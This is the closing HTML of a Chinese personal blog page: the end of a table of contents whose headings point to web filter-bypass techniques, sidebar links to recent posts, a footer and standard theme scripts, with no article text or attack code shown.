href="#7-%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E5%8F%8A%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86"><span class="toc-number">4.0.4.</span> <span class="toc-text">7.编码解码及加密解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9B%B4%E6%94%B9%E8%AF%B7%E6%B1%82%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">4.0.5.</span> <span class="toc-text">8.更改请求提交方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-number">4.1.</span> <span class="toc-text">数据库特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Mysql-%E6%8A%80%E5%B7%A7"><span class="toc-number">4.1.1.</span> <span class="toc-text">1、Mysql 技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81SQL-Server-%E6%8A%80%E5%B7%A7"><span class="toc-number">4.1.2.</span> <span class="toc-text">2、SQL Server 技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81Oracle-%E6%8A%80%E5%B7%A7"><span class="toc-number">4.1.3.</span> <span class="toc-text">3、Oracle 技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%85%8D%E5%90%88-FUZZ"><span class="toc-number">4.1.4.</span> <span class="toc-text">4.配合 FUZZ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E5%B1%82"><span class="toc-number">4.2.</span> <span class="toc-text">逻辑层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98"><span class="toc-number">4.2.1.</span> <span class="toc-text">1、逻辑问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98"><span class="toc-number">4.2.2.</span> <span class="toc-text">2、性能问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">4.2.3.</span> <span class="toc-text">3、白名单</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/09/wang-luo-an-quan-yun-ying-bi-ji/" title="网络安全运营笔记"><img src="https://w.wallhaven.cc/full/96/wallhaven-96w8e8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络安全运营笔记"/></a><div class="content"><a class="title" href="/2022/06/09/wang-luo-an-quan-yun-ying-bi-ji/" title="网络安全运营笔记">网络安全运营笔记</a><time datetime="2022-06-09T03:05:16.000Z" title="发表于 2022-06-09 11:05:16">2022-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/09/yun-ji-suan-gui-na/" title="云计算归纳"><img src="https://w.wallhaven.cc/full/6o/wallhaven-6orjr7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="云计算归纳"/></a><div class="content"><a class="title" href="/2022/06/09/yun-ji-suan-gui-na/" title="云计算归纳">云计算归纳</a><time datetime="2022-06-09T02:13:19.000Z" title="发表于 2022-06-09 10:13:19">2022-06-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/07/wang-luo-cun-chu/" title="网络存储"><img src="https://w.wallhaven.cc/full/e7/wallhaven-e7g71w.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络存储"/></a><div class="content"><a class="title" href="/2022/06/07/wang-luo-cun-chu/" title="网络存储">网络存储</a><time datetime="2022-06-07T15:26:22.000Z" title="发表于 2022-06-07 23:26:22">2022-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/02/hello-world/" title="Hello World"><img src="https://w.wallhaven.cc/full/pk/wallhaven-pkdol3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/06/02/hello-world/" title="Hello World">Hello World</a><time datetime="2022-06-02T07:10:47.387Z" title="发表于 2022-06-02 15:10:47">2022-06-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/23/dian-nao-liang-du-wu-fa-diao-jie-fang-fa/" title="电脑亮度无法调节方法"><img src="https://w.wallhaven.cc/full/pk/wallhaven-pkdol3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="电脑亮度无法调节方法"/></a><div class="content"><a class="title" href="/2022/05/23/dian-nao-liang-du-wu-fa-diao-jie-fang-fa/" title="电脑亮度无法调节方法">电脑亮度无法调节方法</a><time datetime="2022-05-22T20:46:59.000Z" title="发表于 2022-05-23 04:46:59">2022-05-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 四号街1395</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,雯雯" data-fontsize="20px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
